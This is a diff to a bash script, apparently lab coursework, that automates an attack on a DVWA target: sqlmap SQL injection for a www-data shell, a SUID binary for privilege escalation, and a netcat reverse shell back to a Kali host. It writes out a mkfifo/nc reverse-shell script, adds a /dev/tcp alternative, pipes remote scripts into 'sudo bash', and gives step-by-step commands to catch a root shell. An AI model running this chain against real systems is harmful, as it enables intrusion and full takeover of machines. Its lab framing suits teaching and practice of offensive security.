@@ -18,7 +18,7 @@
 #   wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/refs/heads/master/usyd/scripts-library/dvwa-peas.sh | DVWA_PHPSESSID=<PHPSESSID> DVWA_TARGET_URL="http://<IP>" sudo -E bash -s kali_get_os_shell
 #
 # Display instructions on how to trigger the exploit and catch the root shell:
-#   wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/refs/heads/master/usyd/scripts-library/dvwa-peas.sh | sudo bash -s kali_trigger_exploit
+#   wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/refs/heads/master/usyd/scripts-library/dvwa-peas.sh | sudo bash -s guide_trigger_exploit
 #
 
 # --- Script Configuration ---
@@ -30,12 +30,20 @@ IFS=$'\n\t'
 
 # === ASCII Art Banner & Color Constants ===
 echo ""
-echo "##################################################################################"
-
-echo "#                                                                                #"
-echo "#                     DVWA Privilege Escalation Automation Suite (PEAS)          #"
-echo "##################################################################################"
+echo "##############################################################################################"
+cat <<'EOF'
+ _______  ____    ____ ____    __    ____  ___         .______    _______     ___           _______.
+|       \ \   \  /   / \   \  /  \  /   / /   \        |   _  \  |   ____|   /   \         /       |
+|  .--.  | \   \/   /   \   \/    \/   / /  ^  \       |  |_)  | |  |__     /  ^  \       |   (----`
+|  |  |  |  \      /     \            / /  /_\  \      |   ___/  |   __|   /  /_\  \       \   \    
+|  '--'  |   \    /       \    /\    / /  _____  \     |  |      |  |____ /  _____  \  .----)   |   
+|_______/     \__/         \__/  \__/ /__/     \__\    | _|      |_______/__/     \__\ |_______/   
+#                                                                                                  #
+#                          DVWA Privilege Escalation Automation Suite (PEAS)                       #
+EOF
+echo "##############################################################################################"
 echo ""
+
 RESET="\033[0m"; GREEN="\033[1;32m"; RED="\033[1;31m"; YELLOW="\033[1;33m"; CYAN="\033[1;36m"; PINK="\033[1;35m"
 
 # === Helper Functions ===
@@ -126,6 +134,7 @@ EOF
 # This script creates a reverse shell back to the attacker (Kali VM).
 rm -f /tmp/f; mkfifo /tmp/f
 cat /tmp/f | /bin/bash -i 2>&1 | nc ${KALI_HOST_IP} 1234 > /tmp/f
+#/bin/bash -i >& /dev/tcp/${KALI_HOST_IP}/1234 0>&1
 EOF
     chmod +x "$REVERSE_SHELL_SCRIPT"
     print_success "Reverse shell script created and made executable."
@@ -143,7 +152,7 @@ ubuntu_run_peas_scan() {
     local PEAS_SCRIPT_PATH="/tmp/linpeas.sh"
     local PEAS_REPORT_PATH="/tmp/linpeas_scan_report.txt"
 
-    print_info "Downloading the latest linpeas.sh script..."
+    print_info "Downloading the latest linpeas.sh script.."
     if wget -q "$PEAS_URL" -O "$PEAS_SCRIPT_PATH"; then
         print_success "linpeas.sh downloaded to ${PEAS_SCRIPT_PATH}."
     else
@@ -224,26 +233,30 @@ kali_exploit_sqlmap_os_shell() {
 
 guide_trigger_escalation() {
     print_title "Guide: Triggering the Privilege Escalation"
-    print_info "This process requires two terminals: one on your Kali VM and one in your active sqlmap shell."
+    print_info "This process requires two terminals on your Kali VM and one active sqlmap shell."
 
-    print_info "\n--- Step 1: On your KALI VM (Attacker) ---"
-    print_info "Open a new terminal and start a netcat listener to catch the incoming root shell."
-    print_info "Run this exact command:"
+    print_info "\n--- Step 1: On your KALI VM (Terminal 1 - The Listener) ---"
+    print_warn "CRITICAL: The Kali firewall may block the incoming connection. You must allow it first."
+    print_info "Run this command to allow incoming connections on port 1234:"
+    echo -e "${GREEN}sudo ufw allow 1234/tcp${RESET}"
+    echo ""
+    print_info "Now, start a netcat listener to catch the incoming root shell:"
     echo -e "${GREEN}nc -lvnp 1234${RESET}"
     print_warn "Your terminal will now be waiting. Do not close it."
     
-    print_info "\n--- Step 2: In your SQLMAP OS SHELL (The www-data shell on the Target) ---"
-    print_info "You should already have an OS shell from running the 'kali_get_os_shell' command."
-    print_info "First, verify you are the 'www-data' user by typing:"
+    print_info "\n--- Step 2: In your SQLMAP OS SHELL (The www-data shell) ---"
+    print_info "After getting the 'os-shell>' prompt from the 'kali_get_os_shell' command, verify your user:"
     echo -e "${GREEN}whoami${RESET}"
-    print_info "Now, execute the SUID binary you created earlier:"
-    echo -e "${GREEN}/tmp/escalate${RESET}"
+    print_info "Now, execute the SUID binary you created on the Ubuntu VM (it will not produce output here):"
+    echo -e "${GREEN}/opt/escalation_tools/escalate${RESET}"
 
-    print_info "\n--- Step 3: Check your KALI VM Netcat Listener ---"
-    print_success "If successful, your netcat listener terminal will now be an interactive ROOT SHELL on the Ubuntu VM!"
-    print_info "To verify, type 'whoami' in the netcat terminal. The output should be:"
-    echo -e "${RED}root${RESET}"
-    print_info "You now have full control of the target machine."
+    print_info "\n--- Step 3: Check your KALI VM Netcat Listener (Terminal 1) ---"
+    print_success "Your netcat listener should now be an interactive ROOT SHELL!"
+    print_info "To verify, type 'whoami' in the netcat terminal. The output should be: ${RED}root${RESET}"
+
+    print_info "\n--- Step 4: On your KALI VM (Cleanup) ---"
+    print_info "After you are finished, it is good practice to remove the firewall rule:"
+    echo -e "${GREEN}sudo ufw delete allow 1234/tcp${RESET}"
 }
 
 # === MAIN LOGIC ===
@@ -257,7 +270,7 @@ case "${1:-}" in
     "kali_get_os_shell")
         kali_exploit_sqlmap_os_shell
         ;;
-    "kali_trigger_exploit")
+    "guide_trigger_exploit")
         guide_trigger_escalation
         ;;
     *)
@@ -270,7 +283,7 @@ case "${1:-}" in
         echo ""
         echo "Arguments for Kali VM (Attacker):"
         echo "  kali_get_os_shell  : Runs sqlmap to get the initial www-data OS shell."
-        echo "  kali_trigger_exploit : Shows instructions on how to use the exploit and catch the root shell."
+        echo "  guide_trigger_exploit : Shows instructions on how to use the exploit and catch the root shell."
         exit 1
         ;;
 esac
